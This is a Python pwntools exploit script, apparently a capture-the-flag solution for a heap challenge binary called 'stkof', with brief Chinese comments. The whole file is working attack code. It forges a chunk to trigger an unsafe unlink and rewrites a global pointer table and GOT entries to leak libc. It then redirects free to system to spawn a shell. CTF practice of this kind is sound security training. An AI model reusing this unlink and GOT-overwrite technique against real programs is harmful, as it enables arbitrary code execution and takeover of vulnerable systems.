#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
from pwn import *
context(log_level='debug',os='linux',arch='amd64')

p = process("./stkof")
elf = ELF("./stkof")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')

def edit(idx, size, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n')

def free(idx):
    p.sendline('3')
    p.sendline(str(idx))

def show(idx):
    p.sendline('4')
    p.sendline(str(idx))

globals = 0x0602140
ptr = globals + 0x10

create(0x48)	# 1
create(0x30)	# 2
create(0x80)	# 3

# 伪造一个堆块；修改chunk3 size；
payload0 = p64(0) + p64(0x20)
payload0 += p64(ptr-0x18) + p64(ptr-0x10)
payload0 += p64(0x20)
payload0 = payload0.ljust(0x30,'a')
payload0 += p64(0x30) + p64(0x90)
edit(2,len(payload0),payload0)
# 触发unlink
free(3)
p.recvuntil('OK\n')

# 修改global指针表
payload1 = "skye".ljust(0x8,'a')
payload1 += p64(elf.got['free'])	# 0
payload1 += p64(elf.got['puts'])	# 1
payload1 += p64(globals-0x8)		# 2
edit(2,len(payload1),payload1)

# overwrite free 2 puts
edit(0,8,p64(elf.plt['puts']))
# leak libc
free(1)

puts_addr = u64(p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00'))
log.info("puts_addr:"+hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
binsh_addr = libc_base + next(libc.search('/bin/sh'))
system_addr = libc_base + libc.symbols['system']
log.success('libc_base:' + hex(libc_base))
log.success('binsh_addr:' + hex(binsh_addr))
log.success('system_addr:' + hex(system_addr))

# 修改global指针表
payload2 = "skye".ljust(0x8,'a')
payload2 += p64(elf.got['free'])	# 0
payload2 += p64(binsh_addr)			# 1
edit(2,len(payload2),payload2)
# overwrite free 2 system
edit(0,8,p64(system_addr))
# gdb.attach(p,'b *0x0400919')
free(1)


p.interactive()